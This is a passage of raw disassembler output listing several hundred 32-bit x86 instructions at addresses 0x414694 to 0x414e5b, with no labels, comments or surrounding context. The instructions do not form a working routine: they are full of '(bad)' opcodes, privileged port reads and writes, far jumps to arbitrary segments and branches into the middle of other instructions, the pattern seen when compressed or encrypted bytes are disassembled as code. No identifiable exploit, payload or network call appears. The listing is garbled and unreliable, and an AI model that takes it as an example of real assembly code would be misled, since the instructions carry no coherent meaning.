  414694:	or     ch,BYTE PTR [esp+esi*4-0x2e]
  414698:	lods   eax,DWORD PTR ds:[esi]
  414699:	out    0xb4,eax
  41469b:	fmul   st(3),st
  41469d:	fs adc al,0xae
  4146a0:	jmp    0xdffbb50d
  4146a5:	ss pop eax
  4146a7:	or     ecx,DWORD PTR [ebx+0x66d2893e]
  4146ad:	pop    ss
  4146ae:	dec    ecx
  4146af:	call   0x90415626
  4146b4:	push   es
  4146b5:	jle    0x4146f2
  4146b7:	rol    BYTE PTR [esi-0x69b4bd06],1
  4146bd:	in     al,dx
  4146be:	mov    bl,BYTE PTR [edi]
  4146c0:	mov    edx,0x290f2440
  4146c5:	out    dx,al
  4146c6:	and    BYTE PTR ds:0xeebbf3a0,al
  4146cc:	adc    al,0x83
  4146ce:	cmp    DWORD PTR [ebx+0x5d64ef0f],eax
  4146d4:	sbb    dh,al
  4146d6:	mov    al,0xe5
  4146d8:	jmp    0x4146a3
  4146da:	loop   0x414759
  4146dc:	xchg   esp,eax
  4146dd:	dec    edi
  4146de:	imul   cl
  4146e0:	mov    eax,ds:0x3abd03c5
  4146e5:	sub    al,0x91
  4146e7:	(bad)  
  4146e8:	sahf   
  4146e9:	ja     0x414698
  4146eb:	xchg   ecx,eax
  4146ec:	pslld  mm7,QWORD PTR ds:0x4dcf6198
  4146f3:	xor    eax,0x47d9079e
  4146f8:	pop    ss
  4146f9:	lock xor DWORD PTR [edi],ebp
  4146fc:	jp     0x41470c
  4146fe:	xor    DWORD PTR [eax],ebx
  414700:	ret    0xb6d8
  414703:	ds inc edx
  414705:	push   0xba5480e9
  41470a:	inc    ecx
  41470b:	jae    0x414730
  41470d:	mov    cs,WORD PTR [ecx]
  41470f:	call   0xce4f4733
  414714:	scas   eax,DWORD PTR es:[edi]
  414715:	repz cdq 
  414717:	outs   dx,DWORD PTR ds:[esi]
  414718:	sti    
  414719:	sbb    al,0x10
  41471b:	mov    esi,0xed6e043a
  414720:	sbb    BYTE PTR [ebx+0x5429e8d7],dl
  414726:	xlat   BYTE PTR ds:[ebx]
  414727:	ret    
  414728:	loop   0x414746
  41472a:	xor    ebp,edx
  41472c:	call   0x2f02:0xfdfed7c9
  414733:	jo     0x41472d
  414735:	mov    WORD PTR [edi+0xe],?
  414738:	inc    ebp
  414739:	cdq    
  41473a:	jle    0x41470b
  41473c:	(bad)  
  41473d:	pop    ebx
  41473e:	sub    eax,0x420c6eda
  414743:	fsubr  QWORD PTR [ecx-0x53ccdd75]
  41474a:	lock loop 0x4146eb
  41474d:	ror    BYTE PTR [edi],cl
  41474f:	sbb    DWORD PTR [ebx+eax*4],ebx
  414752:	xor    eax,0x64ecf25c
  414757:	mov    dh,0xcc
  414759:	bound  esi,QWORD PTR [eax+0x3e]
  41475c:	int3   
  41475d:	jno    0x414739
  41475f:	ja     0x41478c
  414761:	push   ds
  414762:	icebp  
  414763:	xor    esi,eax
  414765:	mov    bh,0xb9
  414767:	call   DWORD PTR ds:0xd2e1a644
  41476d:	hlt    
  41476e:	jg     0x4147b7
  414770:	dec    ebp
  414771:	sahf   
  414772:	pop    ebx
  414773:	ds cld 
  414775:	push   eax
  414776:	mov    ebx,0xe7279411
  41477b:	or     DWORD PTR [esi-0x524df63],esp
  414781:	es das 
  414783:	in     eax,0x52
  414785:	and    al,0xe5
  414787:	inc    eax
  414788:	in     al,0x63
  41478a:	push   ecx
  41478b:	outs   dx,DWORD PTR ds:[esi]
  41478c:	mov    ah,0xf0
  41478e:	inc    esi
  41478f:	mov    ebp,0x2920d3cf
  414794:	out    dx,eax
  414795:	adc    eax,0x9782f0f5
  41479a:	fstp   TBYTE PTR [ecx-0x253da9ef]
  4147a0:	in     al,dx
  4147a1:	sub    ecx,ebp
  4147a3:	xchg   esi,eax
  4147a4:	jo     0x414805
  4147a6:	push   ds
  4147a7:	cmp    eax,DWORD PTR [edx]
  4147a9:	shl    BYTE PTR [ebx+0x794a498a],0x24
  4147b0:	add    edi,DWORD PTR [edi]
  4147b2:	adc    DWORD PTR [ebx+0xdb4a93b],edx
  4147b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147b9:	loop   0x414786
  4147bb:	into   
  4147bc:	jmp    0x41477c
  4147be:	cmp    eax,0xb1aebb84
  4147c3:	sub    esp,eax
  4147c5:	(bad)  
  4147c6:	stc    
  4147c7:	test   bl,0x1e
  4147ca:	and    BYTE PTR [eax+edx*4],cl
  4147cd:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4147cf:	or     ch,BYTE PTR [ebx+0x1]
  4147d2:	push   0x5acf51d4
  4147d7:	jmp    0x4147ca
  4147d9:	or     eax,0x9948def4
  4147de:	mov    ebx,0x31044aa2
  4147e3:	ret    
  4147e4:	pop    ecx
  4147e5:	push   ecx
  4147e6:	ins    BYTE PTR es:[edi],dx
  4147e7:	adc    ecx,eax
  4147e9:	mov    ?,WORD PTR [esi-0x60]
  4147ec:	xor    al,dh
  4147ee:	pop    edi
  4147ef:	or     DWORD PTR [edi-0x44],ecx
  4147f2:	inc    eax
  4147f3:	test   DWORD PTR [edx+0x22],0x2454b140
  4147fa:	or     eax,DWORD PTR [edx]
  4147fc:	pop    edx
  4147fd:	mov    esi,0x43bece90
  414802:	adc    esp,edi
  414804:	test   BYTE PTR [ebx-0x73488340],cl
  41480a:	pop    esi
  41480b:	fst    st(3)
  41480d:	or     al,0xf9
  41480f:	jbe    0x414889
  414811:	xchg   ecx,eax
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	in     eax,dx
  414814:	and    al,0x84
  414816:	int3   
  414817:	aad    0xca
  414819:	in     eax,0xd5
  41481b:	sbb    DWORD PTR [edx],edi
  41481d:	mov    al,ds:0x43ca318c
  414822:	mov    al,ds:0x2ca71b09
  414827:	fld    TBYTE PTR [eax-0xfd6634]
  41482d:	mov    edx,0x90e66326
  414832:	xchg   esp,eax
  414833:	adc    DWORD PTR [edx+0x6e],edi
  414836:	retf   
  414837:	inc    eax
  414838:	xlat   BYTE PTR ds:[ebx]
  414839:	sar    DWORD PTR [ebx+0x2bd902f8],cl
  41483f:	add    DWORD PTR ss:[ecx],ebp
  414842:	fld    DWORD PTR [esi+0x2a5f66b3]
  414848:	fcmovb st,st(5)
  41484a:	test   eax,0x23300884
  41484f:	jae    0x41480b
  414851:	xchg   edi,ecx
  414853:	inc    edi
  414854:	adc    BYTE PTR [esi-0x5a6ad3f4],0xfc
  41485b:	push   cs
  41485c:	rcl    BYTE PTR [ecx+edx*1-0x7d],1
  414860:	xchg   ebx,eax
  414861:	jp     0x4148a8
  414863:	shl    WORD PTR [ebp+0x50],1
  414867:	lds    esp,FWORD PTR [eax+eax*8]
  41486a:	mov    edi,0x27c17cbb
  41486f:	pusha  
  414870:	xchg   edx,eax
  414871:	ins    BYTE PTR es:[edi],dx
  414872:	sbb    BYTE PTR [edi],dh
  414874:	std    
  414875:	push   ds
  414876:	leave  
  414877:	pop    ss
  414878:	jb     0x41487b
  41487a:	ja     0x41488d
  41487c:	popa   
  41487d:	ret    0x8a6
  414880:	sub    DWORD PTR [eax],0xffffff83
  414883:	push   ebx
  414884:	or     BYTE PTR [eax],0xb3
  414887:	or     al,0x6f
  414889:	sub    BYTE PTR [ebx-0x8ba4b2d],ah
  41488f:	and    eax,0xea03234f
  414894:	and    edx,eax
  414896:	fmul   DWORD PTR [edi-0x4c]
  414899:	fdivr  st,st(2)
  41489b:	in     eax,0xe4
  41489d:	imul   DWORD PTR [edi+0x4]
  4148a0:	dec    edx
  4148a1:	push   esp
  4148a2:	sub    DWORD PTR [ecx-0x72802a73],0xffffffba
  4148a9:	mov    dl,0x95
  4148ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148ac:	es jge 0x41492c
  4148af:	mov    esp,0x84991295
  4148b4:	cmp    BYTE PTR [ecx],dh
  4148b6:	vmwrite esi,DWORD PTR [ebp+0xf]
  4148ba:	jbe    0x4148ac
  4148bc:	jl     0x414866
  4148be:	enter  0xb39a,0x85
  4148c2:	fbstp  TBYTE PTR [edi+0x68]
  4148c5:	popf   
  4148c6:	jle    0x414923
  4148c8:	scas   al,BYTE PTR es:[edi]
  4148c9:	clc    
  4148ca:	stos   BYTE PTR es:[edi],al
  4148cb:	mov    edx,DWORD PTR ds:0xac8169a2
  4148d1:	lods   al,BYTE PTR ds:[esi]
  4148d2:	rcr    BYTE PTR [ebp-0x56],cl
  4148d5:	(bad)  
  4148d6:	mov    esp,0xbeb66092
  4148db:	fld    TBYTE PTR [ebp+0x0]
  4148de:	stos   DWORD PTR es:[edi],eax
  4148df:	mov    bl,0xf0
  4148e1:	fs rol esi,1
  4148e4:	mov    cl,0xa9
  4148e6:	pop    es
  4148e7:	push   es
  4148e8:	ins    DWORD PTR es:[edi],dx
  4148e9:	bound  esp,QWORD PTR [eax+eiz*4-0xece9940]
  4148f0:	sbb    BYTE PTR [ebp-0x6f],al
  4148f3:	retf   0x3c9c
  4148f6:	std    
  4148f7:	popf   
  4148f8:	call   0xebcd60f8
  4148fd:	dec    esi
  4148fe:	sbb    eax,0xa0c5b2aa
  414903:	cmp    eax,0x709a4a79
  414908:	rcr    DWORD PTR [edx],cl
  41490a:	pusha  
  41490b:	mov    ds:0x5a85498e,eax
  414910:	stc    
  414911:	adc    eax,0x48d4c619
  414916:	mov    edx,0x74adaef0
  41491b:	test   al,0xd
  41491d:	stc    
  41491e:	mov    esp,0x37d20c8d
  414923:	(bad)  
  414924:	cmc    
  414925:	xchg   edi,eax
  414926:	mov    ebx,0x4aedb0a2
  41492b:	shr    BYTE PTR [esi-0x46],cl
  41492e:	int3   
  41492f:	sub    DWORD PTR [ebx-0x17],0x21
  414933:	add    al,0x89
  414935:	sbb    al,0xd
  414937:	mov    dl,0xa0
  414939:	scas   eax,DWORD PTR es:[edi]
  41493a:	add    BYTE PTR [esi-0x2a],bh
  41493d:	scas   al,BYTE PTR es:[edi]
  41493e:	outs   dx,DWORD PTR ds:[esi]
  41493f:	outs   dx,BYTE PTR ds:[esi]
  414940:	cmc    
  414941:	outs   dx,DWORD PTR ds:[esi]
  414942:	xchg   ecx,eax
  414943:	mov    ch,0x19
  414945:	retf   
  414946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414947:	sub    eax,0xd4c2d8c6
  41494c:	and    esp,ebp
  41494e:	or     BYTE PTR [ebp-0x20],bh
  414951:	xor    DWORD PTR [edi],ebp
  414953:	xor    eax,0xf5ba1a41
  414958:	push   es
  414959:	les    eax,FWORD PTR [ebx-0x4d]
  41495c:	addr16 xchg ebx,eax
  41495e:	fs mov esp,0x79ff1a59
  414964:	xlat   BYTE PTR ds:[ebx]
  414965:	int    0x1e
  414967:	pusha  
  414968:	out    dx,eax
  414969:	hlt    
  41496a:	ins    DWORD PTR es:[edi],dx
  41496b:	mov    ch,0x8e
  41496d:	mov    ds:0x866b98c4,al
  414972:	outs   dx,BYTE PTR ds:[esi]
  414973:	retf   
  414974:	pop    esi
  414975:	ds ret 0x405f
  414979:	mov    ebp,DWORD PTR [eax+0x72e02f72]
  41497f:	hlt    
  414980:	psllq  mm0,mm2
  414983:	js     0x41493e
  414985:	out    0x6a,eax
  414987:	xchg   ebp,eax
  414988:	stos   DWORD PTR es:[edi],eax
  414989:	outs   dx,BYTE PTR ds:[esi]
  41498a:	jnp    0x4149d6
  41498c:	sbb    eax,0x3c6f3d45
  414991:	inc    edi
  414992:	ins    BYTE PTR es:[edi],dx
  414993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414994:	in     al,0xd6
  414996:	icebp  
  414997:	jbe    0x4149b8
  414999:	rol    DWORD PTR [ecx+0x411ae44e],0x0
  4149a0:	push   0x66f74a47
  4149a5:	in     al,dx
  4149a6:	cmp    eax,0xf6b78f63
  4149ab:	cmp    al,0xe7
  4149ad:	push   ds
  4149ae:	hlt    
  4149af:	xchg   BYTE PTR [ebx-0x7be3d993],cl
  4149b5:	(bad)  
  4149b6:	shl    DWORD PTR [eax-0x7d33f030],1
  4149bc:	xchg   edi,eax
  4149bd:	nop
  4149be:	push   edi
  4149bf:	jmp    0xeb1aa474
  4149c4:	pop    ds
  4149c5:	mov    WORD PTR ds:[edx],ss
  4149c8:	mov    esi,esp
  4149ca:	dec    esp
  4149cb:	int    0x9e
  4149cd:	(bad)  
  4149ce:	and    BYTE PTR [esp+edi*2],dl
  4149d1:	jl     0x414a07
  4149d3:	test   DWORD PTR [ecx],ebp
  4149d5:	retf   0xac5b
  4149d8:	std    
  4149d9:	shr    BYTE PTR [ebp-0x1aeba970],cl
  4149df:	mul    DWORD PTR [ecx-0x5f]
  4149e2:	jmp    0xf36ace0b
  4149e7:	inc    ebx
  4149e8:	inc    edx
  4149e9:	mov    BYTE PTR [esi-0x32e28d33],dl
  4149ef:	fcom   DWORD PTR [ecx+0x1ce81558]
  4149f5:	test   DWORD PTR [eax-0x57],0x2eb023da
  4149fc:	jmp    0x1eea1402
  414a01:	iret   
  414a02:	mov    eax,0x343f9f07
  414a07:	popf   
  414a08:	jge    0x4149e7
  414a0a:	retf   
  414a0b:	je     0x414a59
  414a0d:	hlt    
  414a0e:	inc    eax
  414a0f:	cwde   
  414a10:	(bad)  
  414a11:	sub    ebp,DWORD PTR [edi-0x14db6d58]
  414a17:	inc    ebp
  414a18:	mov    dl,0x55
  414a1a:	add    BYTE PTR [esi+0x69],ch
  414a1d:	jp     0x4149bb
  414a1f:	rcl    DWORD PTR [eax+0x5b],0x4b
  414a23:	and    al,BYTE PTR [edi]
  414a25:	jb     0x4149c1
  414a27:	pcmpeqd mm4,mm7
  414a2a:	push   ss
  414a2b:	add    eax,0xe5e3834c
  414a30:	int3   
  414a31:	in     al,dx
  414a32:	push   cs
  414a33:	imul   ebx,DWORD PTR [edx+0x1b5f18bf],0xffffffbc
  414a3a:	jmp    0x414a15
  414a3c:	das    
  414a3d:	sub    BYTE PTR [edx+0x44f609ff],dl
  414a43:	lods   al,BYTE PTR ds:[esi]
  414a44:	mov    edx,0x3330ace7
  414a49:	js     0x414abb
  414a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a4c:	push   0x540ba570
  414a51:	mov    ebp,DWORD PTR [edi]
  414a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a54:	or     DWORD PTR [eax],ebx
  414a56:	jmp    0x8b45:0x54326da8
  414a5d:	iret   
  414a5e:	sub    al,0xc9
  414a60:	push   edx
  414a61:	lahf   
  414a62:	sahf   
  414a63:	or     DWORD PTR [esi],esp
  414a65:	xchg   esi,eax
  414a66:	or     DWORD PTR [edi+0x79f138ff],edi
  414a6c:	call   0xe3ce:0x5f9316b3
  414a73:	mov    ebx,0xfdad851f
  414a78:	retf   0xa265
  414a7b:	and    DWORD PTR [esp+esi*1+0x3b],edx
  414a7f:	jge    0x414a4d
  414a81:	mov    esp,0xac346776
  414a86:	push   ecx
  414a87:	int3   
  414a88:	and    DWORD PTR [ebx-0x6dbcb69a],ecx
  414a8e:	popa   
  414a8f:	or     al,0x48
  414a91:	sbb    al,0x1f
  414a93:	inc    ebx
  414a94:	arpl   bp,si
  414a96:	repnz mov ds:0x8b075849,eax
  414a9c:	clc    
  414a9d:	sub    dh,0x2e
  414aa0:	push   esi
  414aa1:	jmp    0x656b:0x12be8605
  414aa8:	imul   ebx,DWORD PTR [edi],0x63b80b70
  414aae:	(bad)  
  414aaf:	ds retf 0x1d06
  414ab3:	scas   eax,DWORD PTR es:[edi]
  414ab4:	call   0x51530e8a
  414ab9:	push   edx
  414aba:	jno    0x414aea
  414abc:	bound  ecx,QWORD PTR [eax+esi*8+0x6404c02f]
  414ac3:	and    DWORD PTR [edi],0x2
  414ac6:	dec    ebp
  414ac7:	dec    eax
  414ac8:	jne    0x414aae
  414aca:	arpl   WORD PTR [edi-0x3ddbe9ee],sp
  414ad0:	or     eax,DWORD PTR [esi-0x64]
  414ad3:	fdiv   QWORD PTR [ebx+ecx*8-0xcdcb293]
  414ada:	cmp    ebp,DWORD PTR [ebx+0x32ea6735]
  414ae0:	inc    esp
  414ae1:	call   0x86a1975b
  414ae6:	xor    DWORD PTR [edx+0x57],0xffffffcd
  414aea:	dec    ebp
  414aeb:	loope  0x414b38
  414aed:	add    al,BYTE PTR [edx]
  414aef:	sbb    DWORD PTR [eax+0x282db254],edx
  414af5:	lahf   
  414af6:	fcmovnbe st,st(4)
  414af8:	aam    0xa3
  414afa:	pop    ebx
  414afb:	mov    eax,0x3bbfca6a
  414b00:	in     al,0xc3
  414b02:	and    eax,0x39872fc
  414b07:	xchg   ebp,eax
  414b08:	or     eax,0xc28438ed
  414b0d:	or     eax,0xb2ca5085
  414b12:	add    al,ah
  414b14:	cwde   
  414b15:	push   esi
  414b16:	mov    esp,0x793bffb4
  414b1b:	adc    esp,DWORD PTR [eax]
  414b1d:	aam    0xf
  414b1f:	add    eax,0x86b101a7
  414b24:	outs   dx,BYTE PTR ds:[esi]
  414b25:	idiv   DWORD PTR [eax]
  414b27:	push   esp
  414b28:	in     al,dx
  414b29:	gs push cs
  414b2b:	add    ecx,ebp
  414b2d:	push   esi
  414b2e:	rol    DWORD PTR [ebp+0x77],0xcf
  414b32:	sbb    eax,0xe91f5c54
  414b37:	and    al,0x14
  414b39:	adc    esp,DWORD PTR [eax-0x11]
  414b3c:	mov    WORD PTR [ebp+0x7daf9d83],ss
  414b42:	jb     0x414bb0
  414b44:	test   eax,0xfc1d1e89
  414b49:	sbb    DWORD PTR [eax+eiz*1],edx
  414b4c:	fmul   QWORD PTR ds:0x910e2c02
  414b52:	sbb    BYTE PTR [eax],dh
  414b54:	js     0x414b2a
  414b56:	test   al,0x3f
  414b58:	add    ah,0x37
  414b5b:	or     al,0xef
  414b5d:	enter  0x4a2,0xc2
  414b61:	cmp    ch,BYTE PTR [eax]
  414b63:	fild   WORD PTR [ecx]
  414b65:	stos   BYTE PTR es:[edi],al
  414b66:	jmp    0x68412481
  414b6b:	std    
  414b6c:	inc    edi
  414b6d:	sti    
  414b6e:	stos   DWORD PTR es:[edi],eax
  414b6f:	or     ah,BYTE PTR [edx+0x15e66d88]
  414b75:	push   eax
  414b76:	mov    ah,bh
  414b78:	fwait
  414b79:	xchg   ebx,eax
  414b7a:	imul   edi,DWORD PTR [ebp-0x1ae83ab2],0xffffffb6
  414b81:	jl     0x414b24
  414b83:	sub    eax,0xd05f3f01
  414b88:	jmp    0xddbf:0x42dd24b6
  414b8f:	push   edx
  414b90:	push   ebx
  414b91:	idiv   eax
  414b93:	cmp    ah,cl
  414b95:	mov    edx,0x6ebbc341
  414b9a:	xchg   ebp,eax
  414b9b:	adc    ecx,esi
  414b9d:	xchg   edi,eax
  414b9e:	inc    ecx
  414b9f:	je     0x414bc7
  414ba1:	mov    esp,0x105e899c
  414ba6:	sub    BYTE PTR [esi],ch
  414ba8:	xchg   esi,eax
  414ba9:	sub    DWORD PTR [eax+eax*4],0x7fac9871
  414bb0:	xchg   ebx,eax
  414bb1:	add    edi,esp
  414bb3:	sub    DWORD PTR [ebx+0x141157c2],esp
  414bb9:	in     eax,dx
  414bba:	aaa    
  414bbb:	(bad)  
  414bbc:	mov    cl,0x90
  414bbe:	add    DWORD PTR ds:0x5b2130b0,0x3dae5c52
  414bc8:	rol    DWORD PTR [ebx+esi*2+0x12669092],0x46
  414bd0:	call   0x33b9:0x6a10fd32
  414bd7:	or     eax,0x60d064f
  414bdc:	scas   eax,DWORD PTR es:[edi]
  414bdd:	and    DWORD PTR ds:0x65c51286,edi
  414be3:	pop    edx
  414be4:	mov    ah,0xdc
  414be6:	cmovne esi,DWORD PTR [edx]
  414be9:	push   ebp
  414bea:	sub    eax,0x53cf23f1
  414bef:	xor    al,0x1f
  414bf1:	std    
  414bf2:	lods   eax,DWORD PTR ds:[esi]
  414bf3:	fwait
  414bf4:	add    al,0x22
  414bf6:	and    al,0xf3
  414bf8:	data16 mov al,ds:0x108904af
  414bfe:	stos   BYTE PTR es:[edi],al
  414bff:	xchg   esi,eax
  414c00:	mov    DWORD PTR [ecx],eax
  414c02:	js     0x414c4c
  414c04:	xor    BYTE PTR [esi],dh
  414c06:	outs   dx,DWORD PTR ds:[esi]
  414c07:	xchg   edi,eax
  414c08:	lock out 0x58,eax
  414c0b:	dec    ecx
  414c0c:	sub    DWORD PTR [edx-0x2e],edi
  414c0f:	jmp    0x414bf8
  414c11:	pop    ds
  414c12:	xor    ah,BYTE PTR [edx+edx*2-0x1c]
  414c16:	dec    esp
  414c17:	push   ebx
  414c18:	js     0x414bb7
  414c1a:	cs dec esp
  414c1c:	lock cmp ebp,DWORD PTR [esi+eiz*8]
  414c20:	xchg   BYTE PTR [ebx-0x4e1bea1e],bh
  414c26:	arpl   WORD PTR [esi-0x2c720e38],ax
  414c2c:	pop    edi
  414c2d:	(bad)  
  414c2e:	jecxz  0x414c10
  414c30:	(bad)  
  414c31:	or     DWORD PTR [edx],0x94563f04
  414c37:	repnz inc edi
  414c39:	les    eax,FWORD PTR [edi+0x6a]
  414c3c:	pop    edx
  414c3d:	out    0x5b,eax
  414c3f:	cwde   
  414c40:	pusha  
  414c41:	inc    eax
  414c42:	inc    esi
  414c43:	mov    BYTE PTR [edx],ah
  414c45:	fst    QWORD PTR [edi+0x2c]
  414c48:	lea    ebp,[esi+ebp*8-0x5354645d]
  414c4f:	sbb    eax,0x31411ec9
  414c54:	pop    ds
  414c55:	xor    ah,dl
  414c57:	aaa    
  414c58:	adc    BYTE PTR [eax+0x78537cf3],cl
  414c5e:	ret    0x977a
  414c61:	out    dx,al
  414c62:	adc    cl,bl
  414c64:	ja     0x414ca0
  414c66:	aam    0xaf
  414c68:	jp     0x414c0c
  414c6a:	dec    ecx
  414c6b:	sbb    esp,DWORD PTR [edx-0x48]
  414c6e:	dec    ebx
  414c6f:	jge    0x414ccd
  414c71:	push   ebx
  414c72:	in     al,0x76
  414c74:	xchg   esi,eax
  414c75:	(bad)  
  414c76:	arpl   WORD PTR [edi],cx
  414c78:	(bad)  
  414c7a:	cmp    BYTE PTR [edx-0x7f],dh
  414c7d:	push   esi
  414c7e:	retf   
  414c7f:	fiadd  DWORD PTR [ebp-0x3bc53388]
  414c85:	jge    0x414c10
  414c87:	mov    edx,edi
  414c89:	fisttp DWORD PTR [eax-0x6d]
  414c8c:	shl    BYTE PTR [edx+0x39238e26],0x27
  414c93:	push   ebp
  414c94:	stc    
  414c95:	jecxz  0x414c6c
  414c97:	test   eax,0xdb0823d9
  414c9c:	push   ecx
  414c9d:	(bad)  
  414c9e:	mov    ds:0xa4b11e2e,al
  414ca3:	aaa    
  414ca4:	in     al,0xe2
  414ca6:	pop    esi
  414ca7:	pop    esp
  414ca8:	lods   al,BYTE PTR ds:[esi]
  414ca9:	jge    0x414d15
  414cab:	(bad)  
  414cac:	int3   
  414cad:	mov    BYTE PTR [esi+edx*8],cl
  414cb0:	mov    esi,DWORD PTR [ebx+0x18]
  414cb3:	rcl    BYTE PTR ds:0xf91a5741,cl
  414cb9:	cwde   
  414cba:	daa    
  414cbb:	sub    al,0x90
  414cbd:	fnsave [esi+edx*1+0x30]
  414cc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cc2:	mul    BYTE PTR [esi+0x74]
  414cc5:	mov    ah,0xc1
  414cc7:	and    DWORD PTR [eax+0x33],esp
  414cca:	xchg   DWORD PTR [esp-0x2],ecx
  414cce:	mov    esp,0xca0cf4e9
  414cd3:	stos   DWORD PTR es:[edi],eax
  414cd4:	rol    DWORD PTR [esi-0x3a952669],cl
  414cda:	push   eax
  414cdb:	popa   
  414cdc:	add    al,0x94
  414cde:	fdivr  DWORD PTR [edi+0x5e]
  414ce1:	retf   0x78ae
  414ce4:	inc    esi
  414ce5:	push   ss
  414ce6:	sub    BYTE PTR [ebx-0x19],ah
  414ce9:	iret   
  414cea:	jge    0x414d27
  414cec:	dec    eax
  414ced:	cmp    bl,0xf8
  414cf0:	ffreep st(7)
  414cf2:	stos   BYTE PTR es:[edi],al
  414cf3:	in     eax,0x3f
  414cf5:	(bad)  
  414cf7:	push   ebp
  414cf8:	ins    BYTE PTR es:[edi],dx
  414cf9:	lods   al,BYTE PTR ds:[esi]
  414cfa:	stc    
  414cfb:	sub    eax,0x4d9b0ce4
  414d00:	mov    ch,0xb9
  414d02:	(bad)  
  414d03:	and    BYTE PTR [ebx+0x3e65472b],dh
  414d09:	out    0x65,eax
  414d0b:	into   
  414d0c:	or     ebp,ebx
  414d0e:	jns    0x414d0d
  414d10:	and    esp,ebp
  414d12:	and    DWORD PTR [edi],0xbd26827d
  414d18:	je     0x414d99
  414d1a:	push   edx
  414d1b:	adc    DWORD PTR [edi+edi*1+0x2840224c],ebx
  414d22:	rcl    BYTE PTR [eax+0x2110eb6d],1
  414d28:	mov    ch,0xf7
  414d2a:	ret    
  414d2b:	inc    esi
  414d2c:	(bad)  
  414d2d:	out    0xdf,al
  414d2f:	stos   DWORD PTR es:[edi],eax
  414d30:	loopne 0x414cc2
  414d32:	adc    al,0xb1
  414d34:	inc    esp
  414d35:	or     BYTE PTR [edx+0x444e4b1d],0xdd
  414d3c:	push   eax
  414d3d:	pop    ds
  414d3e:	sbb    eax,0x2ed39b17
  414d43:	sbb    ch,al
  414d45:	stos   BYTE PTR es:[edi],al
  414d46:	enter  0x4b2b,0xbf
  414d4a:	xchg   esi,eax
  414d4b:	jne    0x414ce0
  414d4d:	cdq    
  414d4e:	sar    BYTE PTR [esi+0xbfb0948],1
  414d54:	repz push ebx
  414d56:	mov    ds:0xdcb44591,al
  414d5b:	mov    WORD PTR [edx-0x79],ss
  414d5e:	loop   0x414d0b
  414d60:	add    edi,DWORD PTR [eax]
  414d62:	mov    DWORD PTR [edi],edi
  414d64:	push   0x1fc328d5
  414d69:	out    0xba,al
  414d6b:	js     0x414de1
  414d6d:	outs   dx,BYTE PTR ds:[esi]
  414d6e:	or     DWORD PTR [ebx+ebx*1-0x798e2b82],edx
  414d75:	retf   0x8bee
  414d78:	shr    DWORD PTR [eax+0x2c57b30e],cl
  414d7e:	xchg   esp,eax
  414d7f:	push   ebx
  414d80:	sbb    al,0x3b
  414d82:	or     ebp,DWORD PTR [eax]
  414d84:	test   eax,0x9e821c43
  414d89:	cmp    al,0x3a
  414d8b:	mov    ebp,0x50814886
  414d90:	jnp    0x414def
  414d92:	mov    bh,0x97
  414d94:	jp     0x414d23
  414d96:	adc    ah,bh
  414d98:	mov    ebx,DWORD PTR [ebx+0x29356126]
  414d9e:	aam    0x2b
  414da0:	mov    eax,0x274b920a
  414da5:	sbb    DWORD PTR [ebp-0xb5db7fe],edx
  414dab:	add    edi,DWORD PTR [edx]
  414dad:	sub    BYTE PTR [edi+0x21],dl
  414db0:	and    DWORD PTR [edx+esi*1-0x67],esp
  414db4:	imul   ebp,esi,0xffffffba
  414db7:	aaa    
  414db8:	cld    
  414db9:	inc    esi
  414dba:	out    dx,al
  414dbb:	ret    
  414dbc:	sti    
  414dbd:	aaa    
  414dbe:	js     0x414d67
  414dc0:	push   ss
  414dc1:	xchg   esp,eax
  414dc2:	std    
  414dc3:	es (bad) 
  414dc5:	push   eax
  414dc6:	adc    BYTE PTR [ecx+0x1f0f2119],dl
  414dcc:	jle    0x414dc4
  414dce:	ror    BYTE PTR [ebx+0x67237acf],cl
  414dd4:	sti    
  414dd5:	fs ins DWORD PTR es:[edi],dx
  414dd7:	loop   0x414db9
  414dd9:	scas   al,BYTE PTR es:[edi]
  414dda:	adc    BYTE PTR [edi+0x50633898],cl
  414de0:	ret    
  414de1:	mov    ch,0xd4
  414de3:	mov    al,0xfb
  414de5:	nop
  414de6:	pusha  
  414de7:	adc    BYTE PTR [ebp+0xdf886b8],dl
  414ded:	add    al,bl
  414def:	dec    ecx
  414df0:	fild   WORD PTR [eax-0x3ef1a06d]
  414df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414df7:	call   FWORD PTR [eax]
  414df9:	adc    BYTE PTR [ebx-0x492241d8],al
  414dff:	fisub  WORD PTR [eax+0x54]
  414e02:	xor    DWORD PTR [ecx-0x7d2a1a7d],ecx
  414e08:	je     0x414e84
  414e0a:	and    DWORD PTR [ecx+eax*1],esp
  414e0d:	sub    al,0xea
  414e0f:	push   0x68
  414e11:	or     BYTE PTR ds:0x4612120b,bh
  414e17:	xchg   esp,edx
  414e19:	test   eax,0xc35ac71b
  414e1e:	push   edi
  414e1f:	test   al,0xe9
  414e21:	or     BYTE PTR ds:0x76ee3fc2,ch
  414e27:	cmc    
  414e28:	xlat   BYTE PTR ds:[ebx]
  414e29:	add    esi,DWORD PTR ds:0x7249c546
  414e2f:	outs   dx,BYTE PTR ds:[esi]
  414e30:	mul    BYTE PTR [esp+eiz*8+0x3d19c092]
  414e37:	sar    BYTE PTR [eax+ecx*1-0xc],0x4d
  414e3c:	pushf  
  414e3d:	xchg   esi,eax
  414e3e:	push   edi
  414e3f:	rcl    DWORD PTR [ebx],0x8e
  414e42:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  414e44:	cmp    dh,BYTE PTR [ecx-0x3b]
  414e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e48:	jae    0x414dd2
  414e4a:	shl    DWORD PTR [ebp-0x52],cl
  414e4d:	inc    ebx
  414e4e:	jle    0x414df8
  414e50:	pop    ecx
  414e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e52:	(bad)  
  414e54:	inc    ecx
  414e55:	xor    ebp,DWORD PTR [eax+0x28]
  414e58:	ins    DWORD PTR es:[edi],dx
  414e59:	(bad)  
  414e5a:	cmc    
  414e5b:	mov    BYTE PTR es:[edi-0x41e430f0],bl
